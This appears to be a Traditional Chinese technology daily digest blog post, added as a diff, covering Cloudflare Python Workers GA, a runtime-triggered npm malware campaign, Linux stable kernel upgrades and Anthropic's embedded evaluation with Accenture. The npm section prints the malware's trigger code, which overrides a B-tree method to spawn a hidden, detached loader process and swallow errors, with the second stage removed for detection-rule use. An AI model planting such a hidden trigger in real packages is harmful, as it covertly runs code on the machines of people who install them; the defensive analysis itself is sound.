@@ -1,0 +1,173 @@
+---
+title: "Python Workers、執行期 npm 供應鏈攻擊與 Linux LTS：2026-09-22 技術日報"
+description: "2026-09-22 技術日報：Cloudflare 將 Python Workers 推進 GA，npm 惡意套件改在執行期觸發，Linux 6.18.53 與 6.12.111 發出升級警告，Anthropic 將 Accenture 評估員嵌入模型流程。"
+date: 2026-09-22
+tags: ["daily-digest", "python", "security", "software-supply-chain", "linux", "ai"]
+draft: false
+---
+
+*資料截點：2026-09-22 09:01（Asia/Taipei）。本期時間窗為 2026-09-18 09:01 至 2026-09-22 09:01；前一期日報已報導的事件不重複列入，續報只保留新增進度。*
+
+## 重大頭條
+
+### Python Workers 正式 GA，Cloudflare 把 Python 套件生態帶進 Workers
+
+Cloudflare 在 9 月 21 日宣布 [Python Workers now generally available](https://blog.cloudflare.com/python-workers-ga/)。GA 版本把 Python 定位成 Cloudflare Developer Platform 的正式支援語言，支援 FastAPI、Django、Flask，並可直接使用 Workers AI、R2、D1、Hyperdrive、Durable Objects、Queues 與 Workflows。Cloudflare 的[開發者文件](https://developers.cloudflare.com/workers/languages/python/)與[官方範例倉庫](https://github.com/cloudflare/python-workers-examples)提供目前的 `pywrangler` 工作流程；[PEP 783](https://peps.python.org/pep-0783/)則定義了 Pyodide 使用的 `pyemscripten_*_wasm32` 套件標籤。
+
+為何重要：這次的差異不在於把 Python 原始碼包成一個新的函式入口，而在於 Cloudflare 把 WebAssembly、Python 套件封裝、Workers bindings 與網路能力接在同一個執行環境。Cloudflare 表示，Python 物件現在可以直接傳給 Queue，不再需要手動呼叫 `to_js()`；Hyperdrive 也透過 socket syscall bridge 讓既有 MySQL 與 PostgreSQL driver 工作。這降低了 Python 應用移植到 edge runtime 的 glue code，但原生 C、C++、Rust extension 仍需要相容的 WebAssembly wheel。文件在 8 月 26 日仍標示 open beta 並要求 `python_workers` compatibility flag，這代表 GA 公告後仍需要核對帳號、CLI 與文件版本，不能只看部落格標題就假設所有專案已完成遷移。
+
+### npm 惡意活動改在執行期觸發，繞過 lifecycle script 防護
+
+[Checkmarx 的研究](https://checkmarx.com/zero-post/npm-btree-malware-campaign-affects-millions-of-downloads-no-need-for-install-script/)指出，名為 `indexed-btree` 的惡意套件偽裝成 B-tree 工具，將載入器放進 `BTree.prototype.set()`，而不是放在 `preinstall` 或 `postinstall`。[BleepingComputer 9 月 20 日報導](https://www.bleepingcomputer.com/news/security/malicious-npm-packages-evade-install-script-defenses-at-runtime/)確認，該套件已達百萬級週下載量，且同一活動還牽涉九個相關套件；[npm 套件頁面](https://www.npmjs.com/package/indexed-btree)仍可看到其公開套件中繼資料，來源時點不同造成的下載數差異應視為警訊，而不是精確總量。
+
+為何重要：npm v12 對生命週期腳本的限制只保護安裝階段，沒有阻止惡意程式碼藏在應用程式正常呼叫的 API 裡。研究顯示，這個活動會蒐集主機資訊，透過 Slack 與 Telegram 外傳，並從 Sepolia 上的 Ethereum smart contract 取得第二階段內容。攻擊者還建立看似正常的 GitHub 儲存庫、補齊提交紀錄，讓單純的 repository age 或 package metadata 檢查失去效果。對 CI 與開發者工作站而言，套件掃描必須同時涵蓋安裝前後的檔案差異、import 後的行為、子程序建立與異常網路連線。
+
+### Linux 6.18.53 與 6.12.111 同時發出 must upgrade 警告
+
+Linux stable tree 在 9 月 21 日推出 [6.18.53](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.18.53) 與 [6.12.111](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.12.111)。兩個版本都在穩定版公告中要求該系列使用者升級，6.18.53 約含 1,250 個 patch，6.12.111 約含 1,102 個 patch。[LinuxCompatible 的整理](https://www.linuxcompatible.org/story/linux-lts-kernels-61853-and-612111-ship-with-mandatory-upgrade-warnings/)與 [Tux Machines 的發布紀錄](https://news.tuxmachines.org/n/2026/09/21/Stable_kernels_Linux_7_2_7_Linux_6_18_53_and_Linux_6_12_111.shtml)都交叉記錄了版本與升級警告。
+
+為何重要：這不是單一 CVE 的緊急修補，而是涵蓋虛擬化、加密、檔案系統、網路、儲存、GPU、USB 與藍牙的大型 stable backport 集合。6.18.53 的 changelog 包含 MPTCP 子流狀態競爭與計數修正，6.12.111 則包含 AMD SEV、CXL、btrfs、Ceph 與網路驅動的多項修正。Linux 6.12 的支援期限也已延長到 2028 年 12 月，讓它仍是 Debian 13 與 RHEL 10 等企業環境的重要基礎。維運團隊應先在 staging 重新啟動並驗證 out-of-tree module、GPU 驅動、DKMS 與虛擬化工作負載，再安排 production rollout。
+
+### 續報：Anthropic 將 Accenture 評估員嵌入模型流程
+
+Anthropic 在 9 月 18 日宣布 [Partnering with Accenture on embedded evaluation](https://www.anthropic.com/news/accenture-embedded-evaluation)，由 Accenture 的 Faculty AI 團隊負責模型評估、red teaming、alignment assessment 與 safeguard testing。[Reuters](https://www.reuters.com/business/anthropic-accenture-invest-2-billion-ai-model-evaluation-safety-concerns-rise-2026-09-18/)與 [TechCrunch](https://techcrunch.com/2026/09/18/anthropics-first-embedded-evaluator-is-accenture/)交叉報導，Anthropic 與 Accenture 各自預計在五年內投入至少 10 億美元。這是前一期已報導之 embedded evaluator 提案的新增進度，本段不重述原方案。
+
+為何重要：Anthropic 公開承認這種制度仍沒有共同的 access standard、發現通報規則或長期資金模式。評估員將取得接近員工的內部存取權，可以觀察模型訓練與部署決策，也可以直接和員工討論，但 Anthropic 仍保留模型安全責任。這使評估的核心問題從「有沒有第三方報告」變成「第三方能看到什麼、能否保留證據、誰能限制發布」。Anthropic 表示合作是非排他性安排，並會與 METR 等非營利組織討論試點，因此後續應觀察權限範圍、事件升級流程與公開報告是否形成可比較的規格。
+
+## 快速重點
+
+- [Cloudflare 官方公告](https://blog.cloudflare.com/python-workers-ga/)：Python Workers 於 9 月 21 日 GA，支援 FastAPI、Django、Flask 與 Cloudflare bindings。
+- [Cloudflare Python 文件](https://developers.cloudflare.com/workers/languages/python/)：`pywrangler` 可用 `uvx --from workers-py pywrangler init` 建立專案，再以 `uv run pywrangler deploy` 部署；文件頁目前仍保留 beta 與 compatibility flag 說明。
+- [PEP 783](https://peps.python.org/pep-0783/)：PyEmscripten wheel 使用 `pyemscripten_${YEAR}_${PATCH}_wasm32` 平台標籤，解決 Pyodide 原生 extension 的封裝與 ABI 辨識問題。
+- [Checkmarx](https://checkmarx.com/zero-post/npm-btree-malware-campaign-affects-millions-of-downloads-no-need-for-install-script/)：`indexed-btree` 把惡意載入器放在 `BTree.prototype.set()`，不依賴安裝腳本。
+- [BleepingComputer](https://www.bleepingcomputer.com/news/security/malicious-npm-packages-evade-install-script-defenses-at-runtime/)：同一活動還有九個相關 npm 套件，研究者建議已安裝者輪替 secrets 並從乾淨備份還原。
+- [Linux 6.18.53 changelog](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.18.53)：約 1,250 個 patch，涵蓋 MPTCP、GPU、網路、儲存與虛擬化等子系統。
+- [Linux 6.12.111 changelog](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.12.111)：約 1,102 個 patch，包含 AMD SEV、CXL、btrfs、Ceph、USB 與藍牙修正。
+- [Anthropic 公告](https://www.anthropic.com/news/accenture-embedded-evaluation)：Anthropic 與 Accenture 各自預計五年投入至少 10 億美元，Faculty 將負責模型評估與安全測試。
+- [Reuters](https://www.reuters.com/business/anthropic-accenture-invest-2-billion-ai-model-evaluation-safety-concerns-rise-2026-09-18/)：這筆投入合計至少 20 億美元，合作模式給評估員接近員工的存取權限。
+- [Next.js 官方預告](https://nextjs.org/blog/upcoming-nextjs-security-release-september-22-2026)：Vercel 預計在 9 月 22 日發布 16.3.6 與 15.5.26，修正尚未公開完整細節的 upstream critical issue；截至資料截點仍應視為預告。
+- [AWS News Blog](https://aws.amazon.com/blogs/aws/aws-weekly-roundup-aws-builder-center-mobile-apps-amazon-connect-talent-ga-amazon-corretto-27-and-more-september-14-2026/)：AWS 的新 AgentCore runtime 以 snapshot restore 縮短 cold start，官方測試的空 agent P75 約為 2 秒，需與自身 workload 實測後再評估。
+
+## 細節說明
+
+### Python Workers 的移植邊界在 ABI、bindings 與 socket
+
+Cloudflare 的 GA 公告把此前需要手動轉換 JavaScript 物件的 Queue 呼叫改成 Python 原生資料結構。差異可以用官方範例的改前與改後表示：
+
+```python
+# 改前：需要自己處理 Pyodide 的 JavaScript 物件轉換
+from pyodide.ffi import to_js
+import js
+
+self.env.QUEUE.send(to_js({"key": "value"}, dict_converter=js.Object.fromEntries))
+
+# 改後：Workers runtime 與 Python SDK 處理轉換
+self.env.QUEUE.send({"key": "value"})
+```
+
+FastAPI 也不需要在 Worker 內啟動 Uvicorn 或 Gunicorn，`workers.asgi` 會把 Workers request 轉成 ASGI 介面：
+
+```python
+from fastapi import FastAPI
+from workers import asgi
+
+app = FastAPI()
+
+@app.get("/")
+async def root():
+    return {"message": "hello"}
+
+Default = asgi.entrypoint(app)
+```
+
+這個模型把 HTTP server 的責任交給 Workers platform，把應用程式的責任留在 FastAPI。對資料庫連線，Cloudflare 以 Workers connect API 實作 Python socket syscall bridge，讓 `aiomysql` 或 `asyncpg` 不必知道底層是 WebAssembly。原生 extension 的限制仍存在，套件必須使用相容的 Emscripten toolchain 與 linker flags；PEP 783 因此使用版本化的 `pyemscripten_*_wasm32` tag，而不是只標示一個模糊的 `emscripten` 平台。這也是 GA 後最需要實測的地方，純 Python 套件與帶 native extension 的套件不能用同一張相容清單處理。
+
+### npm v12 之後，掃描點從 install script 移到 API call
+
+研究報告中的惡意程式把觸發條件放在一般套件方法裡。以下保留 Checkmarx 公開的觸發模式，刪除第二階段內容；它適合用來寫靜態規則，不應在任何環境執行：
+
+```javascript
+BTree.prototype.set = function (key, value, overwrite) {
+  try {
+    const path = require("path");
+    const fs = require("fs");
+    const { spawn } = require("child_process");
+    const loadPath = path.join(__dirname, "extended", "sharedLoad.min.js");
+
+    if (fs.existsSync(loadPath) && key === 100) {
+      const child = spawn("node", [loadPath, String(key)], {
+        detached: true,
+        stdio: "ignore",
+        windowsHide: true,
+      });
+      child.unref();
+    }
+  } catch (error) {
+    // 惡意樣本會吞掉錯誤，降低使用者察覺機會
+  }
+};
+```
+
+這段程式碼不需要 `package.json` 的 `postinstall` 就能在應用程式呼叫 `set(100, ...)` 時啟動子程序。`child_process`、背景 detached process、隱藏的 `.min.js` 載入器與吞錯誤組合在一般資料結構套件中並不合理，應該成為掃描規則的高風險訊號。單一正規表示式不夠，因為攻擊者可以改變方法名稱、字串拼接或觸發 key；掃描器還要比較已發佈 tarball 與來源 commit、檢查 import 後的程序樹，以及監看非預期的 Slack、Telegram 或鏈上 RPC 連線。對已安裝的版本，僅刪除 `node_modules` 不足以證明主機乾淨，應輪替工作站與 CI 的 token、API key、SSH key，再從可信映像檔重建。
+
+### Linux stable release 的風險在變更廣度，不是單一版本號
+
+Linux 6.18.53 的官方 changelog 顯示，MPTCP 修正了子流狀態變更與排程器之間的競爭，也調整錯誤路徑中的 copied byte accounting。6.12.111 則包含 AMD KVM SEV、CXL、btrfs、Ceph、PCI、USB 與藍牙等修正，這些元件的風險模型不同，不能用單一 smoke test 取代完整驗證。兩個系列都收到 must upgrade 警告，表示維護者認為整體修正量不適合當成一般小版本看待。更新前應把目前 kernel、DKMS、initramfs 與 out-of-tree module 記錄下來，並保留可回滾的舊 kernel。
+
+```bash
+# 先記錄執行中的核心與模組狀態
+uname -r
+lsmod > /var/tmp/lsmod.before-upgrade
+dkms status
+
+# 在 staging 更新後確認版本與模組是否成功載入
+uname -r
+journalctl -b -p warning..alert --no-pager
+```
+
+這段檢查不是發行版專用的升級命令，而是把升級前後的可比較證據留下來。實際套件更新仍應依 Debian、RHEL、Ubuntu 或自建映像的核准流程執行。容器主機特別需要確認 host kernel，而不是只更新 container image，因為容器共享主機核心。對使用 GPU、SR-IOV、KVM、Ceph 或 eBPF 的節點，應把驅動與觀測代理列入同一個 rollout ring。
+
+### Embedded evaluation 仍缺少可比較的技術介面
+
+Anthropic 公告的新資訊是合作對象、資金與執行方式，而不是另一份抽象治理宣言。Faculty 的評估員會在 Anthropic 內部執行 red team、alignment assessment 與 safeguard testing，並取得接近員工的存取權限。Anthropic 同時承認目前沒有統一規定，說明評估員應能看到哪些資訊、發現應如何通報，以及誰負擔長期評估成本。若沒有這些介面，兩家模型公司的「獨立評估」很難比較，因為一份報告可能只看得到模型 API，另一份報告卻看得到訓練資料流程、部署權限和事件紀錄。後續值得追蹤的不是投入金額本身，而是權限清單、證據保留、衝突申報、發布審查與高風險事件的 escalation SLA。
+
+## 值得追蹤的版本、RFC 與提案
+
+- [Python Workers GA 公告](https://blog.cloudflare.com/python-workers-ga/)與[官方文件](https://developers.cloudflare.com/workers/languages/python/)：確認 `python_workers` compatibility flag、`pywrangler`、Hyperdrive socket bridge 及已支援的 package matrix 是否同步更新。
+- [PEP 783: Emscripten Packaging](https://peps.python.org/pep-0783/)：追蹤 `pyemscripten_${YEAR}_${PATCH}_wasm32` wheel tag 在 PyPA tooling、`packaging` 與 `cibuildwheel` 的落地。
+- [Next.js 即將發布的安全更新](https://nextjs.org/blog/upcoming-nextjs-security-release-september-22-2026)：截至本期截點，GHSA-vcvr-r3jv-pc5j 的完整影響範圍尚未公開；更新發布後再核對 16.3.6、15.5.26 的實際 advisory 與 affected range。
+- [Linux 6.18.53 changelog](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.18.53)與[6.12.111 changelog](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.12.111)：追蹤發行版 backport、DKMS 相容性及 2028 年底前的 LTS 維護節奏。
+- [npm lifecycle script 限制背景](https://www.bleepingcomputer.com/news/security/malicious-npm-packages-evade-install-script-defenses-at-runtime/)：把 install-time allowlist 延伸到 runtime import、程序樹、網路 egress 與 provenance 驗證。
+- [Anthropic embedded evaluation](https://www.anthropic.com/news/accenture-embedded-evaluation)：追蹤評估員實際 access scope、發現發布規則、METR 等非營利組織的參與方式，以及是否形成跨實驗室標準。
+
+## 參考來源表
+
+| 主題 | 來源與日期 | 來源類型 |
+| --- | --- | --- |
+| Python Workers GA | [Python Workers are now generally available](https://blog.cloudflare.com/python-workers-ga/)（2026-09-21，免費） | Cloudflare Blog |
+| Python Workers 使用方式 | [Write Cloudflare Workers in Python](https://developers.cloudflare.com/workers/languages/python/)（查閱 2026-09-22，免費） | Cloudflare Docs |
+| Python Workers 範例 | [cloudflare/python-workers-examples](https://github.com/cloudflare/python-workers-examples)（查閱 2026-09-22，免費） | GitHub |
+| PyEmscripten packaging | [PEP 783: Emscripten Packaging](https://peps.python.org/pep-0783/)（2026-04-06 accepted，免費） | Python PEP |
+| npm 惡意活動研究 | [npm 'btree' Malware Campaign Affects Millions of Downloads, No Need for Install Script](https://checkmarx.com/zero-post/npm-btree-malware-campaign-affects-millions-of-downloads-no-need-for-install-script/)（2026-09-17，免費） | Checkmarx Zero |
+| npm 惡意活動報導 | [Malicious npm packages evade install-script defenses at runtime](https://www.bleepingcomputer.com/news/security/malicious-npm-packages-evade-install-script-defenses-at-runtime/)（2026-09-20，免費） | BleepingComputer |
+| npm 套件中繼資料 | [indexed-btree](https://www.npmjs.com/package/indexed-btree)（查閱 2026-09-22，免費） | npm |
+| Linux 6.18.53 | [ChangeLog-6.18.53](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.18.53)（2026-09-21，免費） | kernel.org |
+| Linux 6.12.111 | [ChangeLog-6.12.111](https://cdn.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.12.111)（2026-09-21，免費） | kernel.org |
+| Linux stable 更新 | [Linux LTS Kernels 6.18.53 and 6.12.111 Ship with Mandatory Upgrade Warnings](https://www.linuxcompatible.org/story/linux-lts-kernels-61853-and-612111-ship-with-mandatory-upgrade-warnings/)（2026-09-21，免費） | LinuxCompatible |
+| Linux release mirror | [Stable kernels: Linux 7.2.7, Linux 6.18.53, and Linux 6.12.111](https://news.tuxmachines.org/n/2026/09/21/Stable_kernels_Linux_7_2_7_Linux_6_18_53_and_Linux_6_12_111.shtml)（2026-09-21，免費） | Tux Machines |
+| Anthropic embedded evaluation | [Partnering with Accenture on embedded evaluation](https://www.anthropic.com/news/accenture-embedded-evaluation)（2026-09-18，免費） | Anthropic |
+| Anthropic 與 Accenture 投入 | [Anthropic, Accenture to invest $2 billion in AI model evaluation as safety concerns rise](https://www.reuters.com/business/anthropic-accenture-invest-2-billion-ai-model-evaluation-safety-concerns-rise-2026-09-18/)（2026-09-18，可能有付費牆） | Reuters |
+| Anthropic 評估合作分析 | [Anthropic's first embedded evaluator is ... Accenture?](https://techcrunch.com/2026/09/18/anthropics-first-embedded-evaluator-is-accenture/)（2026-09-18，免費） | TechCrunch |
+| Next.js 預告 | [Upcoming Next.js Security Update for a Critical Upstream Issue](https://nextjs.org/blog/upcoming-nextjs-security-release-september-22-2026)（2026-09-21，免費） | Next.js Blog |
+| AWS AgentCore runtime | [AWS Weekly Roundup: AWS Builder Center mobile apps, Amazon Connect Talent GA, Amazon Corretto 27, and more](https://aws.amazon.com/blogs/aws/aws-weekly-roundup-aws-builder-center-mobile-apps-amazon-connect-talent-ga-and-more-september-14-2026/)（2026-09-21，免費） | AWS News Blog |
+
+## 延伸閱讀方向
+
+- PyEmscripten wheel tag、Emscripten ABI flags 與 native Python extension 的可攜性
+- ASGI、WSGI 在 WebAssembly sandbox 內的 request bridge 與 socket syscall 實作
+- npm runtime behavioral analysis、SBOM、provenance 與 import-time 風險評估
+- B-tree 套件 API 內嵌載入器、detached child process 與鏈上 C2 的偵測規則
+- Linux stable review、LTS backport、DKMS 與 GPU、KVM、Ceph 節點的分批升級
+- MPTCP 狀態機競爭、CXL memory expansion 與 AMD SEV 的驗證方法
+- Embedded evaluator 的 access scope、證據保留、衝突申報與事件發布 SLA
+- Next.js upstream dependency advisory 的 affected range、版本升級與暫時緩解
